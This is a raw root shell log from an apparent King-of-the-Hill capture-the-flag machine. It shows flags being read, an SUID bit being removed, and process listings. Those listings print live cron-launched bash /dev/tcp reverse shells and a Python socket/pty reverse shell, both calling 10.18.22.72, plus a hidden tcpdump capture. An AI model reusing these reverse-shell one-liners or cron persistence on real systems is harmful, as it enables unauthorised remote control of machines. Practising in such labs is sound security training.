ps aux | grep node 
root     29404  0.0  0.1  14224  1028 ?        S    12:51   0:00 grep --color=auto node
root@spacejam:/var/lib/.log/.dig# w
 12:52:05 up 11 min,  0 users,  load average: 1.39, 0.70, 0.41
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root@spacejam:/var/lib/.log/.dig# cd /root
root@spacejam:~# ls
king.txt
root.txt
root@spacejam:~# cat root.txt
218f5ea7a4d711eef60171e5c92ba9e1
root@spacejam:~# cat /home/jordan/user.txt
79973eb57d0188ffc6c85a1a4e57a516
root@spacejam:~# ps aux | grep node 
root      5086  0.0  0.1  14224  1092 ?        S    12:53   0:00 grep --color=auto node
root@spacejam:~# chmod u-s /usr/bin/fnd 
chmod: cannot access '/usr/bin/fnd': No such file or directory
root@spacejam:~# chmod u-s /usr/bin/find 
root@spacejam:~# w
 12:55:13 up 14 min,  0 users,  load average: 1.49, 1.32, 0.74
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root@spacejam:~# ps auxf 
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    12:40   0:00 [kthreadd]
root         3  0.2  0.0      0     0 ?        S    12:40   0:02  \_ [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [kworker/u30:0]
root         7  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [migration/0]
root        10  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [netns]
root        13  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [perf]
root        14  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [xenwatch]
root        15  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [xenbus]
root        17  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [khungtaskd]
root        18  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [writeback]
root        19  0.0  0.0      0     0 ?        SN   12:40   0:00  \_ [ksmd]
root        20  0.0  0.0      0     0 ?        SN   12:40   0:00  \_ [khugepaged]
root        21  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [crypto]
root        22  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [kintegrityd]
root        23  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        24  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [kblockd]
root        25  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [ata_sff]
root        26  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [md]
root        27  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [devfreq_wq]
root        30  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [kswapd0]
root        31  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [vmstat]
root        32  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [fsnotify_mark]
root        33  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [ecryptfs-kthrea]
root        49  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [kthrotld]
root        50  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [acpi_thermal_pm]
root        51  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        52  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        53  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        54  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        55  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        56  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        57  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        58  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        59  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [scsi_eh_0]
root        60  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [scsi_tmf_0]
root        61  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [scsi_eh_1]
root        62  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [scsi_tmf_1]
root        64  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        69  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [ipv6_addrconf]
root        70  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        83  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [deferwq]
root        84  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [charger_manager]
root       122  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       123  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       124  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       125  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       126  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       127  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       128  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       129  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       130  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [kpsmoused]
root       131  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [kworker/0:2]
root       144  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [ttm_swap]
root       226  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [kworker/0:1H]
root       234  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [raid5wq]
root       259  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       291  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [jbd2/xvda1-8]
root       292  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [ext4-rsv-conver]
root       369  0.0  0.0      0     0 ?        S<   12:41   0:00  \_ [iscsi_eh]
root       375  0.0  0.0      0     0 ?        S<   12:41   0:00  \_ [ib_addr]
root       378  0.0  0.0      0     0 ?        S<   12:41   0:00  \_ [ib_mcast]
root       379  0.0  0.0      0     0 ?        S    12:41   0:00  \_ [kauditd]
root       380  0.0  0.0      0     0 ?        S<   12:41   0:00  \_ [ib_nl_sa_wq]
root       385  0.0  0.0      0     0 ?        S<   12:41   0:00  \_ [ib_cm]
root       386  0.0  0.0      0     0 ?        S<   12:41   0:00  \_ [iw_cm_wq]
root       390  0.0  0.0      0     0 ?        S<   12:41   0:00  \_ [rdma_cm]
root      1475  0.0  0.0      0     0 ?        S    12:46   0:00  \_ [kworker/0:0]
root      1477  0.0  0.0      0     0 ?        S    12:46   0:00  \_ [kworker/u30:2]
root     14000  0.0  0.0      0     0 ?        S    12:50   0:00  \_ [kworker/0:3]
root         1  1.9  0.5  37904  5932 ?        Ss   12:40   0:17 /sbin/init
root       350  0.0  0.2  28444  3000 ?        Ss   12:41   0:00 /lib/systemd/systemd-journald
root       407  0.0  0.1  94772  1572 ?        Ss   12:41   0:00 /sbin/lvmetad -f
root       442  0.1  0.4  45680  4896 ?        Ss   12:41   0:01 /lib/systemd/systemd-udevd
systemd+   473  0.0  0.2 100324  2320 ?        Ssl  12:41   0:00 /lib/systemd/systemd-timesyncd
root       724  0.0  0.0  16128   860 ?        Ss   12:41   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       866  0.0  0.2  28544  2828 ?        Ss   12:41   0:00 /lib/systemd/systemd-logind
root       876  0.0  0.1  12876  1844 ?        Ss   12:41   0:00 /usr/sbin/inetd -i
root       887  0.0  0.2  29008  2520 ?        Ss   12:41   0:00 /usr/sbin/cron -f
root      1382  0.0  0.2  50220  2568 ?        S    12:44   0:00  \_ /usr/sbin/CRON -f
root      1383  0.0  0.0   4504   748 ?        Ss   12:44   0:00  |   \_ /bin/sh -c /bin/bash -c 'bash -i >& /dev/tcp/10.18.22.72/9090 0>&1' 
root      1384  0.0  0.1  12504  1860 ?        S    12:44   0:00  |       \_ /bin/bash -c bash -i >& /dev/tcp/10.18.22.72/9090 0>&1
root      1385  0.0  0.3  21180  3048 ?        S    12:44   0:00  |           \_ bash -i
root      1550 17.3  0.2  12520  2700 ?        S    12:49   1:01  |               \_ /bin/bash ./hen
root     22619  0.0  0.3  37508  3388 ?        R    12:55   0:00  |               \_ ps auxf
root      1409  0.0  0.2  50220  2572 ?        S    12:45   0:00  \_ /usr/sbin/CRON -f
root      1413  0.0  0.0   4504   748 ?        Ss   12:45   0:00  |   \_ /bin/sh -c /bin/bash -c 'bash -i >& /dev/tcp/10.18.22.72/9090 0>&1' 
root      1414  0.0  0.1  12504  1728 ?        S    12:45   0:00  |       \_ /bin/bash -c bash -i >& /dev/tcp/10.18.22.72/9090 0>&1
root      1415  0.0  0.2  21176  2180 ?        S    12:45   0:00  |           \_ bash -i
root      1456  0.0  0.2  50220  2572 ?        S    12:46   0:00  \_ /usr/sbin/CRON -f
root      1457  0.0  0.0   4504   744 ?        Ss   12:46   0:00  |   \_ /bin/sh -c /bin/bash -c 'bash -i >& /dev/tcp/10.18.22.72/9090 0>&1' 
root      1458  0.0  0.1  12504  1904 ?        S    12:46   0:00  |       \_ /bin/bash -c bash -i >& /dev/tcp/10.18.22.72/9090 0>&1
root      1459  0.0  0.2  21176  2204 ?        S    12:46   0:00  |           \_ bash -i
root     11919  0.0  0.2  50220  2788 ?        S    12:54   0:00  \_ /usr/sbin/CRON -f
root     11926  0.0  0.0   4504   756 ?        Ss   12:54   0:00  |   \_ /bin/sh -c /bin/bash -c 'bash -i >& /dev/tcp/10.18.22.72/9090 0>&1' 
root     11927  0.0  0.2  12504  3004 ?        S    12:54   0:00  |       \_ /bin/bash -c bash -i >& /dev/tcp/10.18.22.72/9090 0>&1
root     11933  0.0  0.0  12504   196 ?        S    12:54   0:00  |           \_ /bin/bash -c bash -i >& /dev/tcp/10.18.22.72/9090 0>&1
root     20449  0.2  0.2  50220  2788 ?        S    12:55   0:00  \_ /usr/sbin/CRON -f
root     20463  0.0  0.0   4504   740 ?        Ss   12:55   0:00      \_ /bin/sh -c /bin/bash -c 'bash -i >& /dev/tcp/10.18.22.72/9090 0>&1' 
root     20464  0.2  0.2  12504  2984 ?        S    12:55   0:00          \_ /bin/bash -c bash -i >& /dev/tcp/10.18.22.72/9090 0>&1
root     20470  0.0  0.0  12504   204 ?        S    12:55   0:00              \_ /bin/bash -c bash -i >& /dev/tcp/10.18.22.72/9090 0>&1
root       890  0.0  0.5 275768  5732 ?        Ssl  12:41   0:00 /usr/lib/accountsservice/accounts-daemon
root       896  0.4  0.2 637584  3036 ?        Ssl  12:41   0:03 /usr/bin/lxcfs /var/lib/lxcfs/
root       899  0.0  0.1   4396  1292 ?        Ss   12:41   0:00 /usr/sbin/acpid
root       905  0.0  0.6  30980  6624 ?        Ssl  12:41   0:00 /bin/koth
daemon     908  0.0  0.1  26044  1948 ?        Ss   12:41   0:00 /usr/sbin/atd -f
message+   911  0.0  0.3  42880  3592 ?        Ss   12:41   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       914  0.0  2.4 214272 24416 ?        Ssl  12:41   0:00 /usr/lib/snapd/snapd
syslog     922  0.0  0.3 256396  3156 ?        Ssl  12:41   0:00 /usr/sbin/rsyslogd -n
root       941  0.0  0.5 277112  5884 ?        Ssl  12:41   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       949  0.0  0.0  13372   140 ?        Ss   12:41   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root       985  0.0  0.0   5220   136 ?        Ss   12:41   0:00 /sbin/iscsid
root       986  0.0  0.3   5720  3504 ?        S<Ls 12:41   0:00 /sbin/iscsid
mysql      994  0.1 13.4 1114512 136124 ?      Ssl  12:41   0:01 /usr/sbin/mysqld
root      1008  0.0  0.5  65512  5200 ?        Ss   12:41   0:00 /usr/sbin/sshd -D
root      6363  0.0  0.6  92800  6712 ?        Ss   12:50   0:00  \_ sshd: root@notty
root      9881  0.0  0.1   4504  1620 ?        Ss   12:50   0:00      \_ /bin/sh
root     29371  0.0  0.5  20044  5764 ?        S    12:51   0:00          \_ tcpdump -i any -w /tmp/.systemd-1b19387080abd5
root      1100  0.0  0.1  15752  1824 ttyS0    Ss+  12:41   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1103  0.0  0.1  15936  1584 tty1     Ss+  12:41   0:00 /sbin/agetty --noclear tty1 linux
postgres  1150  0.0  2.2 291220 23320 ?        S    12:41   0:00 /usr/lib/postgresql/9.3/bin/postgres -D /var/lib/postgresql/9.3/main -c config_file=/etc/postgresql/9.3/main/postgresql.conf
postgres  1190  0.0  0.3 291220  3920 ?        Ss   12:41   0:00  \_ postgres: checkpointer process   
postgres  1191  0.0  0.5 291220  5280 ?        Ss   12:41   0:00  \_ postgres: writer process   
postgres  1192  0.0  0.3 291220  3916 ?        Ss   12:41   0:00  \_ postgres: wal writer process   
postgres  1193  0.0  0.6 292076  6260 ?        Ss   12:41   0:00  \_ postgres: autovacuum launcher process   
postgres  1195  0.0  0.2 146896  2908 ?        Ss   12:41   0:00  \_ postgres: stats collector process   
root      1174  0.0  2.9 367836 30188 ?        Ss   12:41   0:00 /usr/sbin/apache2 -k start
jordan    1225  0.0  1.2 368268 12716 ?        S    12:41   0:00  \_ /usr/sbin/apache2 -k start
jordan    1229  0.0  1.4 368472 14604 ?        S    12:41   0:00  \_ /usr/sbin/apache2 -k start
jordan    1337  0.0  1.1 368252 11424 ?        S    12:42   0:00  \_ /usr/sbin/apache2 -k start
jordan    1339  0.0  1.0 368212 10740 ?        S    12:42   0:00  \_ /usr/sbin/apache2 -k start
jordan    1343  0.0  1.3 368472 13616 ?        S    12:42   0:00  \_ /usr/sbin/apache2 -k start
jordan    1348  0.0  1.0 367916 10272 ?        S    12:42   0:00  \_ /usr/sbin/apache2 -k start
jordan    1349  0.0  1.3 368464 13196 ?        S    12:42   0:00  \_ /usr/sbin/apache2 -k start
jordan    1357  0.0  1.0 368212 10672 ?        S    12:42   0:00  \_ /usr/sbin/apache2 -k start
jordan    1366  0.0  1.0 368212 10672 ?        S    12:43   0:00  \_ /usr/sbin/apache2 -k start
jordan    1398  0.0  1.2 368276 12728 ?        S    12:44   0:00  \_ /usr/sbin/apache2 -k start
root      1318  0.0  0.0   4504   744 ?        S    12:42   0:00 /bin/sh -c python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.72",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
root      1319  0.0  0.9  44664  9480 ?        S    12:42   0:00  \_ python -c import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.72",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
root      1320  0.0  0.1   4504  1636 pts/0    Ss+  12:42   0:00      \_ /bin/sh
root      1528  0.0  1.4 723020 14456 ?        Sl   12:48   0:00 systemd-pam
root      8685  0.0  0.4  36828  4164 ?        Ss   12:50   0:00 /lib/systemd/systemd --user
root      8687  0.0  0.1  61356  2012 ?        S    12:50   0:00  \_ (sd-pam)
root@spacejam:~# ps aux | grep node 
root     25429  0.0  0.0  14224   932 ?        S    12:55   0:00 grep --color=auto node
root@spacejam:~# ps auxf 
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    12:40   0:00 [kthreadd]
root         3  0.3  0.0      0     0 ?        S    12:40   0:03  \_ [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [kworker/u30:0]
root         7  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [migration/0]
root        10  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [netns]
root        13  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [perf]
root        14  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [xenwatch]
root        15  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [xenbus]
root        17  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [khungtaskd]
root        18  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [writeback]
root        19  0.0  0.0      0     0 ?        SN   12:40   0:00  \_ [ksmd]
root        20  0.0  0.0      0     0 ?        SN   12:40   0:00  \_ [khugepaged]
root        21  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [crypto]
root        22  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [kintegrityd]
root        23  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        24  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [kblockd]
root        25  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [ata_sff]
root        26  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [md]
root        27  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [devfreq_wq]
root        30  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [kswapd0]
root        31  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [vmstat]
root        32  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [fsnotify_mark]
root        33  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [ecryptfs-kthrea]
root        49  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [kthrotld]
root        50  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [acpi_thermal_pm]
root        51  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        52  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        53  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        54  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        55  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        56  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        57  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        58  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        59  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [scsi_eh_0]
root        60  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [scsi_tmf_0]
root        61  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [scsi_eh_1]
root        62  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [scsi_tmf_1]
root        64  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        69  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [ipv6_addrconf]
root        70  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root        83  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [deferwq]
root        84  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [charger_manager]
root       122  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       123  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       124  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       125  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       126  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       127  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       128  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       129  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       130  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [kpsmoused]
root       144  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [ttm_swap]
root       226  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [kworker/0:1H]
root       234  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [raid5wq]
root       259  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [bioset]
root       291  0.0  0.0      0     0 ?        S    12:40   0:00  \_ [jbd2/xvda1-8]
root       292  0.0  0.0      0     0 ?        S<   12:40   0:00  \_ [ext4-rsv-conver]
root       369  0.0  0.0      0     0 ?        S<   12:41   0:00  \_ [iscsi_eh]
root       375  0.0  0.0      0     0 ?        S<   12:41   0:00  \_ [ib_addr]
root       378  0.0  0.0      0     0 ?        S<   12:41   0:00  \_ [ib_mcast]
root       379  0.0  0.0      0     0 ?        S    12:41   0:00  \_ [kauditd]
root       380  0.0  0.0      0     0 ?        S<   12:41   0:00  \_ [ib_nl_sa_wq]
root       385  0.0  0.0      0     0 ?        S<   12:41   0:00  \_ [ib_cm]
root       386  0.0  0.0      0     0 ?        S<   12:41   0:00  \_ [iw_cm_wq]
root       390  0.0  0.0      0     0 ?        S<   12:41   0:00  \_ [rdma_cm]
root      1475  0.0  0.0      0     0 ?        S    12:46   0:00  \_ [kworker/0:0]
root      1477  0.0  0.0      0     0 ?        S    12:46   0:00  \_ [kworker/u30:2]
root     14000  0.0  0.0      0     0 ?        S    12:50   0:00  \_ [kworker/0:3]
root     29487  0.0  0.0      0     0 ?        S    12:56   0:00  \_ [kworker/0:1]
root         1  1.6  0.5  37904  5932 ?        Ss   12:40   0:17 /sbin/init
root       350  0.0  0.2  28444  3000 ?        Ss   12:41   0:00 /lib/systemd/systemd-journald
root       407  0.0  0.1  94772  1572 ?        Ss   12:41   0:00 /sbin/lvmetad -f
root       442  0.1  0.4  45680  4896 ?        Ss   12:41   0:01 /lib/systemd/systemd-udevd
systemd+   473  0.0  0.2 100324  2320 ?        Ssl  12:41   0:00 /lib/systemd/systemd-timesyncd
root       724  0.0  0.0  16128   860 ?        Ss   12:41   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       866  0.0  0.2  28544  2828 ?        Ss   12:41   0:00 /lib/systemd/systemd-logind
root       876  0.0  0.1  12876  1844 ?        Ss   12:41   0:00 /usr/sbin/inetd -i
root       887  0.0  0.2  29008  2520 ?        Ss   12:41   0:00 /usr/sbin/cron -f
root      1382  0.0  0.2  50220  2568 ?        S    12:44   0:00  \_ /usr/sbin/CRON -f
root      1383  0.0  0.0   4504   748 ?        Ss   12:44   0:00  |   \_ /bin/sh -c /bin/bash -c 'bash -i >& /dev/tcp/10.18.22.72/9090 0>&1' 
root      1384  0.0  0.1  12504  1860 ?        S    12:44   0:00  |       \_ /bin/bash -c bash -i >& /dev/tcp/10.18.22.72/9090 0>&1
root      1385  0.0  0.3  21180  3048 ?        S    12:44   0:00  |           \_ bash -i
root      1550 17.8  0.2  12520  2700 ?        S    12:49   1:28  |               \_ /bin/bash ./hen
root      9128  0.0  0.3  37508  3480 ?        R    12:57   0:00  |               \_ ps auxf
root      1409  0.0  0.2  50220  2572 ?        S    12:45   0:00  \_ /usr/sbin/CRON -f
root      1413  0.0  0.0   4504   748 ?        Ss   12:45   0:00  |   \_ /bin/sh -c /bin/bash -c 'bash -i >& /dev/tcp/10.18.22.72/9090 0>&1' 
root      1414  0.0  0.1  12504  1728 ?        S    12:45   0:00  |       \_ /bin/bash -c bash -i >& /dev/tcp/10.18.22.72/9090 0>&1
root      1415  0.0  0.2  21176  2180 ?        S    12:45   0:00  |           \_ bash -i
root      1456  0.0  0.2  50220  2572 ?        S    12:46   0:00  \_ /usr/sbin/CRON -f
root      1457  0.0  0.0   4504   744 ?        Ss   12:46   0:00  |   \_ /bin/sh -c /bin/bash -c 'bash -i >& /dev/tcp/10.18.22.72/9090 0>&1' 
root      1458  0.0  0.1  12504  1904 ?        S    12:46   0:00  |       \_ /bin/bash -c bash -i >& /dev/tcp/10.18.22.72/9090 0>&1
root      1459  0.0  0.2  21176  2204 ?        S    12:46   0:00  |           \_ bash -i
root     28844  0.0  0.2  50220  2788 ?        S    12:56   0:00  \_ /usr/sbin/CRON -f
root     28851  0.0  0.0   4504   776 ?        Ss   12:56   0:00  |   \_ /bin/sh -c /bin/bash -c 'bash -i >& /dev/tcp/10.18.22.72/9090 0>&1' 
root     28852  0.0  0.2  12504  2920 ?        S    12:56   0:00  |       \_ /bin/bash -c bash -i >& /dev/tcp/10.18.22.72/9090 0>&1
root     28853  0.0  0.0  12504   204 ?        S    12:56   0:00  |           \_ /bin/bash -c bash -i >& /dev/tcp/10.18.22.72/9090 0>&1
root      3762  0.0  0.2  50220  2788 ?        S    12:57   0:00  \_ /usr/sbin/CRON -f
root      3765  0.0  0.0   4504   784 ?        Ss   12:57   0:00      \_ /bin/sh -c /bin/bash -c 'bash -i >& /dev/tcp/10.18.22.72/9090 0>&1' 
root      3766  0.0  0.3  12504  3084 ?        S    12:57   0:00          \_ /bin/bash -c bash -i >& /dev/tcp/10.18.22.72/9090 0>&1
root      3768  0.0  0.0  12504   204 ?        S    12:57   0:00              \_ /bin/bash -c bash -i >& /dev/tcp/10.18.22.72/9090 0>&1
root       890  0.0  0.5 275768  5732 ?        Ssl  12:41   0:00 /usr/lib/accountsservice/accounts-daemon
root       896  0.7  0.3 636924  3136 ?        Ssl  12:41   0:07 /usr/bin/lxcfs /var/lib/lxcfs/
root       899  0.0  0.1   4396  1292 ?        Ss   12:41   0:00 /usr/sbin/acpid
root       905  0.0  0.6  30980  6624 ?        Ssl  12:41   0:00 /bin/koth
daemon     908  0.0  0.1  26044  1948 ?        Ss   12:41   0:00 /usr/sbin/atd -f
message+   911  0.0  0.3  42880  3592 ?        Ss   12:41   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       914  0.0  2.4 214272 24716 ?        Ssl  12:41   0:00 /usr/lib/snapd/snapd
syslog     922  0.0  0.3 256396  3156 ?        Ssl  12:41   0:00 /usr/sbin/rsyslogd -n
root       941  0.0  0.5 277112  5884 ?        Ssl  12:41   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       949  0.0  0.0  13372   140 ?        Ss   12:41   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root       985  0.0  0.0   5220   136 ?        Ss   12:41   0:00 /sbin/iscsid
root       986  0.0  0.3   5720  3504 ?        S<Ls 12:41   0:00 /sbin/iscsid
mysql      994  0.1 13.4 1114512 136124 ?      Ssl  12:41   0:01 /usr/sbin/mysqld
root      1008  0.0  0.5  65512  5200 ?        Ss   12:41   0:00 /usr/sbin/sshd -D
root      6363  0.0  0.6  92800  6712 ?        Ss   12:50   0:00  \_ sshd: root@notty
root      9881  0.0  0.1   4504  1620 ?        Ss   12:50   0:00      \_ /bin/sh
root     29371  0.0  0.5  20044  5764 ?        S    12:51   0:00          \_ tcpdump -i any -w /tmp/.systemd-1b19387080abd5
root      1100  0.0  0.1  15752  1824 ttyS0    Ss+  12:41   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1103  0.0  0.1  15936  1584 tty1     Ss+  12:41   0:00 /sbin/agetty --noclear tty1 linux
postgres  1150  0.0  2.2 291220 23320 ?        S    12:41   0:00 /usr/lib/postgresql/9.3/bin/postgres -D /var/lib/postgresql/9.3/main -c config_file=/etc/postgresql/9.3/main/postgresql.conf
postgres  1190  0.0  0.3 291220  3920 ?        Ss   12:41   0:00  \_ postgres: checkpointer process   
postgres  1191  0.0  0.5 291220  5280 ?        Ss   12:41   0:00  \_ postgres: writer process   
postgres  1192  0.0  0.3 291220  3916 ?        Ss   12:41   0:00  \_ postgres: wal writer process   
postgres  1193  0.0  0.6 292076  6260 ?        Ss   12:41   0:00  \_ postgres: autovacuum launcher process   
postgres  1195  0.0  0.2 146896  2908 ?        Ss   12:41   0:00  \_ postgres: stats collector process   
root      1174  0.0  2.9 367836 30188 ?        Ss   12:41   0:00 /usr/sbin/apache2 -k start
jordan    1225  0.0  1.2 368268 12716 ?        S    12:41   0:00  \_ /usr/sbin/apache2 -k start
jordan    1229  0.0  1.4 368472 14604 ?        S    12:41   0:00  \_ /usr/sbin/apache2 -k start
jordan    1337  0.0  1.1 368252 11424 ?        S    12:42   0:00  \_ /usr/sbin/apache2 -k start
jordan    1339  0.0  1.0 368212 10740 ?        S    12:42   0:00  \_ /usr/sbin/apache2 -k start
jordan    1343  0.0  1.3 368472 13616 ?        S    12:42   0:00  \_ /usr/sbin/apache2 -k start
jordan    1348  0.0  1.0 367916 10272 ?        S    12:42   0:00  \_ /usr/sbin/apache2 -k start
jordan    1349  0.0  1.3 368464 13196 ?        S    12:42   0:00  \_ /usr/sbin/apache2 -k start
jordan    1357  0.0  1.0 368212 10672 ?        S    12:42   0:00  \_ /usr/sbin/apache2 -k start
jordan    1366  0.0  1.0 368212 10672 ?        S    12:43   0:00  \_ /usr/sbin/apache2 -k start
